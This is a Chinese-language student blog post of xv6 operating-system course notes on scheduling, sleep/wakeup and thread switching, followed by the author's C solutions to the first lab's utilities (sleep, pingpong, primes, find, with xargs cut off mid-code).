<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> nproc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">        nproc++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nproc &lt;= <span class="number">2</span>) &#123;   <span class="comment">// only init and sh exist</span></span><br><span class="line">      intr_on();</span><br><span class="line">      <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xv6为每个cpu准备了一个<code>struct cpu</code>,这个结构体里就会记录着这个cpu当前运行的<code>proc</code>等等，所有的<code>struct cpu</code>保存在一个数组里，利用当前cpu的<code>tp</code>寄存器的值进行索引。</p>
<p><strong>sleep/wakeup</strong></p>
<p>生产者是一个线程，消费者是一个线程，两个线程之间得需要一个同步机制来协调，比如生产者生产一个产品，消费者才能消费一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码没问题，但是对于消费者来说，如果生产者没有生产的话，那就得一直自旋，十分浪费cpu资源，当引进同步机制后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    wakeup(s);</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        sleep(s, &amp;s-&gt;lock);  <span class="comment">// !pay attention</span></span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即考虑了cpu资源还考虑了条件竞争。</p>
<p><code>pipe</code>就是利用锁和<code>sleep/wakeup</code>实现的，<code>exit/wait</code>也是。</p>
<p>总而言之，锁这块原理不绕，但是使用起来好绕啊。</p>
<h5 id="课程内容-1"><a href="#课程内容-1" class="headerlink" title="课程内容"></a>课程内容</h5><p>主要讲解thread switch</p>
<p>终于知道了定时器中断是个什么董熊了，每个核心都有一个定时器，这个定时器周期性的发出一些中断，这些中断就是定时器中断，所以就算程序没有主动陷入内核，在定时器发生的时候还是会陷入，此时就可以记录程序运行时长和是否切换程序的工作了。</p>
<p>在发生计时器中断的时候，内核处理程序就可以让出cpu给调度器，然后调度器切换线程，在xv6中，让出靠的是yields()函数。</p>
<p>进程之间的切换并不是从这个进程的直接切换到另一个进程的，而是从这个进程的内核线程（线程1）中切换到另一个进程的内核线程（线程2）中，然后在线程2中再自然返回到对应进程中（进程2）。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011154315913.png" alt="image-20221011154315913"></p>
<h4 id="Lecture13"><a href="#Lecture13" class="headerlink" title="Lecture13"></a>Lecture13</h4><p>这节课主要讲解了sleep和wakeup，这是一种常见的协调机制。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221020144559437.png" alt="image-20221020144559437"></p>
<p>当sleep/wakeup不使用锁作为参数的话实现伪代码如上图，如果使用这种sleep/wakeup的话就会造成严重的<code>lost wakeup</code>问题，例子如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221020150533008.png" alt="image-20221020150533008"> </p>
<p><code>uartwrite</code>释放锁之后，中断线程就开始执行了，因为是多核心，所以就会造成一种局面，<code>wakup</code>比<code>slepp</code>提前执行，导致sleep的线程没有人去唤醒了。这就是<code>lsot wakeup</code>。</p>
<p>我以为处理办法是让释放锁和睡眠是原子的就好了，但是xv6并不是这样实现的，而是使用<code>p-&gt;lock</code>，这样也达到了效果。</p>
<p>老师对<code>wait</code>函数也进行了讲解，才明白过来其实子进程的资源回收并不是由子进程自己完成的，而是对自己状态进行标注为可以回收，然后父进程调用wait()的时候检查子进程然后回收。（当然不可能自己回收自己）。</p>
<h4 id="Lecture14"><a href="#Lecture14" class="headerlink" title="Lecture14"></a>Lecture14</h4><p>这节课主要是文件系统的讲解</p>
<h2 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h2><h3 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1: Xv6 and Unix utilities"></a>Lab1: Xv6 and Unix utilities</h3><p>这个实验主要是熟悉xv6的系统调用接口的。</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;your parameter is not number\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h4><p>利用pipe完成父子进程之间双向通信，刚开始没理解透pipe,只用了一个管道，发现怎么都不对，看了别人的代码才恍然大雾，pipe只能完成单向通信，双向肯定得要两个管道啊,不过我错误那一版骗过了lab检查程序，乐</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_to_child[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> p_to_parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    pipe(p_to_child);</span><br><span class="line">    pipe(p_to_parent);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;fork fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="keyword">int</span> ret=read(p_to_child[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received ping\n&quot;</span>,getpid());</span><br><span class="line">        ret=write(p_to_parent[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="keyword">int</span> ret=write(p_to_child[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ret=read(p_to_parent[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received pong\n&quot;</span>,getpid());</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h4><p>这个程序还是比较麻烦的，要求利用fork和管道完成对素数的筛选，理论如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220807185230278.png" alt="image-20220807185230278"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> p_rd,<span class="keyword">int</span> c_wt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    read(p_rd,&amp;first_num,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;prime %d\n&quot;</span>,first_num);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span>(read(p_rd,&amp;num,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(num%first_num!=<span class="number">0</span>)&#123;</span><br><span class="line">            temp++;</span><br><span class="line">            write(c_wt,&amp;num,<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> c[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pipe(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">35</span>;i++)&#123;</span><br><span class="line">        write(p[wt],&amp;i,<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            pipe(c);</span><br><span class="line">            close(p[wt]);</span><br><span class="line">            <span class="keyword">int</span> ret=fun(p[rd],c[wt]);</span><br><span class="line">            close(p[rd]);</span><br><span class="line">            <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p[rd]=c[rd];</span><br><span class="line">            p[wt]=c[wt];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[wt])&#123;</span><br><span class="line">                close(p[wt]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[rd])&#123;</span><br><span class="line">                close(p[rd]);</span><br><span class="line">            &#125;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>这个调了我半个早上🤦‍♀️，首先是程序退出时报错，我试了半天才发现xv6系统的main函数只能以exit()退出，其次是测试程序老是过不去，多方调试后发现自己的一块逻辑写的有明显问题，呜呜呜这明明只是中等难度，代码能力还是太菜了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *file_path,<span class="keyword">char</span> *res)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    memmove(buf,file_path,<span class="built_in">strlen</span>(file_path));</span><br><span class="line">    <span class="keyword">int</span> fd=open(file_path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (read(fd,&amp;de,<span class="keyword">sizeof</span>(de))==<span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">        <span class="keyword">if</span>(de.inum==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;.&quot;</span>)||!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">        memmove(p, de.name, DIRSIZ);</span><br><span class="line">        <span class="keyword">if</span>(stat(buf,&amp;st)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;stat() fail filename :%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(st.type==T_FILE)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,res))&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (st.type==T_DIR)</span><br><span class="line">        &#123;</span><br><span class="line">            p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            find(buf,res);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">         memmove(buf,file_path,<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;parameter fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memmove(buf,argv[<span class="number">1</span>],DIRSIZ);</span><br><span class="line">    p=buf+<span class="built_in">strlen</span>(buf)<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p!=<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        p++;</span><br><span class="line">        *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    find(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><p>主要麻烦的点在对字符串的处理上，我看别人的博客利用了有限自动机，嘿嘿，不会这个高端的东西，我的解决办法是对得到的字符串进行标准化，然后就利于后面的字符串处理了(无脑做法属于)。还有我的代码能力真得弱，这点代码花了我两个小时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 